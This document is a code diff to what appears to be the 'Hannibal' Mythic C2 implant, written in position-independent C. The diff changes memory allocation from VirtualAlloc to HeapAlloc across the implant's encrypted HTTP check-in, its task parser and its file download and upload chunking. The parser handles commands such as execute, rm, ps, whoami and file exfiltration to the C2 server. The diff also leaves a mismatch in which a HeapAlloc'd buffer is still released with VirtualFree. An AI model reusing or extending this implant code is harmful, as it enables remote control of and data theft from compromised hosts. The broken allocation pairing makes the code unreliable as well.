@@ -74,7 +74,8 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_encrypt(uint8_t *buffer,
         key_len_adjusted += 16 - (key_len % 16); 
     }
 
-    uint8_t *ciphertext = (uint8_t*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, ciphertext_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    uint8_t *ciphertext = (uint8_t*)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, ciphertext_size);
 
     if(ciphertext == NULL){
         return;
@@ -109,7 +110,7 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_encrypt(uint8_t *buffer,
 
     // HMAC_SHA256(IV+AES256_CBC_PADDED(buffer))
 
-    uint8_t *iv_msg = (uint8_t*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(iv) + ciphertext_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    uint8_t *iv_msg = (uint8_t*)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(iv) + ciphertext_size);
 
     // char iv_msg[sizeof(iv) + ciphertext_size]; // Large contents exceed stack limits and cause crashes in PIC mode as there's no chkstk
     pic_memcpy(iv_msg, iv, sizeof(iv));
@@ -125,7 +126,8 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_encrypt(uint8_t *buffer,
     int encode_buffer_size = pic_strlen(hannibal_instance_ptr->config.uuid) + sizeof(iv) + ciphertext_size + sizeof(digest);
 
     // Freed below
-    uint8_t *encode_buffer = (uint8_t*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, encode_buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    uint8_t *encode_buffer = (uint8_t*)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, encode_buffer_size);
 
     pic_memcpy(encode_buffer, hannibal_instance_ptr->config.uuid, pic_strlen(hannibal_instance_ptr->config.uuid));
     pic_memcpy(encode_buffer + pic_strlen(hannibal_instance_ptr->config.uuid), iv, sizeof(iv));
@@ -143,7 +145,8 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_encrypt(uint8_t *buffer,
     size_t base64_size = (((4 * encode_buffer_size + 2) / 3) & ~3) + 4;
 
     LPVOID b64_encode_out = {0};
-    b64_encode_out = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, base64_size, MEM_COMMIT, PAGE_READWRITE); // Freed in calling function
+
+    b64_encode_out = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, base64_size); // Freed in calling function
     
     base64_encode(encode_buffer, encode_buffer_size, b64_encode_out);
 
@@ -189,7 +192,8 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_decrypt(uint8_t *buffer,
     // Decode from B64
 
     // Freed below
-    LPVOID b64_decoded_response = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, binary_size, MEM_COMMIT, PAGE_READWRITE);
+
+    LPVOID b64_decoded_response = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, binary_size);
 
     pic_RtlSecureZeroMemory(b64_decoded_response, binary_size);
 
@@ -223,7 +227,8 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_decrypt(uint8_t *buffer,
     // Calcuate the SHA256_HMAC
 
     int iv_msg_size = sizeof(iv) + message_size;
-    uint8_t *iv_msg = (uint8_t*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(iv) + message_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    uint8_t *iv_msg = (uint8_t*)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(iv) + message_size);
 
     // char iv_msg[sizeof(iv) + message_size]; // Corrupting stack
     pic_memcpy(iv_msg, iv, sizeof(iv));
@@ -265,7 +270,8 @@ SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_decrypt(uint8_t *buffer,
         // Decrypt
 
         // Freed in calling function
-        LPVOID decrypt_buffer = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, message_size, MEM_COMMIT, PAGE_READWRITE);
+
+        LPVOID decrypt_buffer = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, message_size);
         pic_memcpy(decrypt_buffer, message_ptr, message_size);
         
         hannibal_instance_ptr->Win32.VirtualFree(b64_decoded_response, 0, MEM_RELEASE);
@@ -359,7 +365,8 @@ SECTION_CODE UINT8* serialize_checkin(const CheckinMessage *message, UINT32 *out
 
 
     // Freed in mythic_http_checkin()
-    UINT8 *buffer = (UINT8*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    UINT8 *buffer = (UINT8*)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, total_size);
     if (!buffer) return NULL;
 
     UINT8 *current_position = buffer;
@@ -457,7 +464,8 @@ SECTION_CODE CheckinMessageResponse* deserialize_checkin_reponse(UINT8 *buffer)
     }
 
     // Freed in mythic_http_checkin()
-    CheckinMessageResponse *message = (CheckinMessageResponse *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CheckinMessageResponse), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    CheckinMessageResponse *message = (CheckinMessageResponse *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CheckinMessageResponse));
 
     if (!message){
         return NULL;
@@ -489,7 +497,8 @@ SECTION_CODE UINT8* serialize_get_tasking_msg(const GetTasksMessage *message, UI
     total_size += sizeof(message->get_delegate_tasks);
     
     // Freed in mythic_http_get_tasks()
-    UINT8 *buffer = (UINT8*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    UINT8 *buffer = (UINT8*)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, total_size);
     UINT8 *current_position = buffer;
 
     if(!buffer){
@@ -641,7 +650,8 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
                 task.cmd_id = CMD_LS_MESSAGE;
 
-                task.cmd = (CMD_LS *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_LS), MEM_COMMIT, PAGE_READWRITE); // Freed in cmd_ls()
+
+                task.cmd = (CMD_LS *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_LS)); // Freed in cmd_ls()
                 if(!task.cmd){
                     return NULL;
                 }
@@ -673,7 +683,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
                 task.cmd_id = CMD_EXIT_MESSAGE;
 
-                task.cmd = (CMD_EXIT *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_EXIT), MEM_COMMIT, PAGE_READWRITE);
+                task.cmd = (CMD_EXIT *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_EXIT));
                 if(!task.cmd){
                     return NULL;
                 }
@@ -705,7 +715,8 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
                 }
 
                 // Freed in mythic_http_start_file_download()
-                fd = (FILE_DOWNLOAD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(FILE_DOWNLOAD), MEM_COMMIT, PAGE_READWRITE);
+
+                fd = (FILE_DOWNLOAD *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(FILE_DOWNLOAD));
                 fd->path = param1_wstring;
                 fd->bytes_sent = 0;
                 fd->download_uuid = 0;
@@ -740,7 +751,8 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
                 }
 
                 // Freed in mythic_http_start_file_upload()
-                fu = (FILE_UPLOAD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(FILE_UPLOAD), MEM_COMMIT, PAGE_READWRITE);
+
+                fu = (FILE_UPLOAD *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(FILE_UPLOAD));
                 fu->path = param1_wstring;
                 fu->bytes_received = 0;
                 fu->chunk_count = 0;
@@ -779,7 +791,8 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_EXECUTE_HBIN_MESSAGE;
 
-            task.cmd = (CMD_EXECUTE_HBIN *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_EXECUTE_HBIN), MEM_COMMIT, PAGE_READWRITE);
+
+            task.cmd = (CMD_EXECUTE_HBIN *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_EXECUTE_HBIN));
             if(!task.cmd){
                 return NULL;
             }
@@ -813,7 +826,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_RM_MESSAGE;
 
-            task.cmd = (CMD_RM *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_RM), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_RM *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_RM));
             if(!task.cmd){
                 return NULL;
             }
@@ -838,7 +851,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_PWD_MESSAGE;
 
-            task.cmd = (CMD_PWD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_PWD), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_PWD *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_PWD));
             if(!task.cmd){
                 return NULL;
             }
@@ -869,7 +882,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_CD_MESSAGE;
 
-            task.cmd = (CMD_CD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_CD), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_CD *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_CD));
             if(!task.cmd){
                 return NULL;
             }
@@ -907,8 +920,8 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
             }
 
             task.cmd_id = CMD_CP_MESSAGE;
-
-            task.cmd = (CMD_CP *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_CP), MEM_COMMIT, PAGE_READWRITE);
+    
+            task.cmd = (CMD_CP *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_CP));
             if(!task.cmd){
                 return NULL;
             }
@@ -948,7 +961,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_MV_MESSAGE;
 
-            task.cmd = (CMD_MV *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_MV), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_MV *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_MV));
             if(!task.cmd){
                 return NULL;
             }
@@ -974,7 +987,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_HOSTNAME_MESSAGE;
 
-            task.cmd = (CMD_HOSTNAME *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_HOSTNAME), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_HOSTNAME *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_HOSTNAME));
             if(!task.cmd){
                 return NULL;
             }
@@ -998,7 +1011,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_WHOAMI_MESSAGE;
 
-            task.cmd = (CMD_WHOAMI *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_WHOAMI), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_WHOAMI *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_WHOAMI));
             if(!task.cmd){
                 return NULL;
             }
@@ -1029,7 +1042,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_MKDIR_MESSAGE;
 
-            task.cmd = (CMD_MKDIR *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_MKDIR), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_MKDIR *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_MKDIR));
             if(!task.cmd){
                 return NULL;
             }
@@ -1054,7 +1067,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_PS_MESSAGE;
 
-            task.cmd = (CMD_PS *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_PS), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_PS *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_PS));
             if(!task.cmd){
                 return NULL;
             }
@@ -1078,7 +1091,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_IPINFO_MESSAGE;
 
-            task.cmd = (CMD_IPINFO *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_IPINFO), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_IPINFO *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_IPINFO));
             if(!task.cmd){
                 return NULL;
             }
@@ -1102,7 +1115,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_LISTDRIVES_MESSAGE;
 
-            task.cmd = (CMD_LISTDRIVES *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_LISTDRIVES), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_LISTDRIVES *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_LISTDRIVES));
             if(!task.cmd){
                 return NULL;
             }
@@ -1133,7 +1146,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_EXECUTE_MESSAGE;
 
-            task.cmd = (CMD_EXECUTE *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_EXECUTE), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_EXECUTE *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_EXECUTE));
             if(!task.cmd){
                 return NULL;
             }
@@ -1172,7 +1185,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_SLEEP_MESSAGE;
 
-            task.cmd = (CMD_SLEEP *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_SLEEP), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_SLEEP *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_SLEEP));
             if(!task.cmd){
                 return NULL;
             }
@@ -1198,7 +1211,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             task.cmd_id = CMD_AGENTINFO_MESSAGE;
 
-            task.cmd = (CMD_AGENTINFO *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_AGENTINFO), MEM_COMMIT, PAGE_READWRITE);
+            task.cmd = (CMD_AGENTINFO *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(CMD_AGENTINFO));
             if(!task.cmd){
                 return NULL;
             }
@@ -1228,7 +1241,7 @@ SECTION_CODE SERIALIZE_POST_TASKS_INFO serialize_post_tasks(UINT8 *buffer, int b
     BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + pic_strlen(task_uuid); // Task GUID TLV
     BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + buffer_size; // Task Content TLV
 
-    UINT8 *content_buffer = (UINT8 *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);
+    UINT8 *content_buffer = (UINT8 *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
 
     UINT8 *buffer_cursor = content_buffer;
 
@@ -1347,7 +1360,7 @@ SECTION_CODE void mythic_http_checkin()
         DWORD dwLength = 0;
         hannibal_instance_ptr->Win32.GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLength);
 
-        TOKEN_MANDATORY_LABEL* pLabel = (TOKEN_MANDATORY_LABEL *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, dwLength, MEM_COMMIT, PAGE_READWRITE);
+        TOKEN_MANDATORY_LABEL* pLabel = (TOKEN_MANDATORY_LABEL *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, dwLength);
 
          if (pLabel != NULL) {
                             
@@ -1706,7 +1719,7 @@ SECTION_CODE void mythic_http_start_file_download(FILE_DOWNLOAD *download)
 
     int serialized_buffer_size = BUFFER_SIZE;
     // Freed in mythic_http_start_file_download()
-    char *serialized_buffer = (char *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);
+    char *serialized_buffer = (char *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
 
     UINT8 *buffer_cursor = serialized_buffer;
 
@@ -1829,7 +1842,7 @@ SECTION_CODE void mythic_http_continue_file_downloads()
             hannibal_instance_ptr->Win32.SetFilePointer(hFile, hannibal_instance_ptr->tasks.file_downloads[i].bytes_sent, NULL, FILE_BEGIN);
 
             // Freed in mythic_http_continue_file_downloads()
-            char *chunk_buffer = (char *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, FILE_DOWNLOAD_CHUNK_SIZE, MEM_COMMIT, PAGE_READWRITE);
+            char *chunk_buffer = (char *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, FILE_DOWNLOAD_CHUNK_SIZE);
 
             DWORD bytes_read;
             hannibal_instance_ptr->Win32.ReadFile(hFile, chunk_buffer, FILE_DOWNLOAD_CHUNK_SIZE, &bytes_read, NULL);
@@ -1850,7 +1863,7 @@ SECTION_CODE void mythic_http_continue_file_downloads()
 
             int serialized_buffer_size = BUFFER_SIZE;
             // Freed in mythic_http_continue_file_downloads()
-            char *serialized_buffer = (char *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);
+            char *serialized_buffer = (char *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
 
             UINT8 *buffer_cursor = serialized_buffer;
 
@@ -2067,7 +2080,7 @@ SECTION_CODE void mythic_http_continue_file_uploads()
             BUFFER_SIZE += sizeof(UINT32); // Chunk size
 
             int serialized_buffer_size = BUFFER_SIZE;
-            char *serialized_buffer = (char *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);
+            char *serialized_buffer = (char *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
 
             UINT8 *buffer_cursor = serialized_buffer;
 
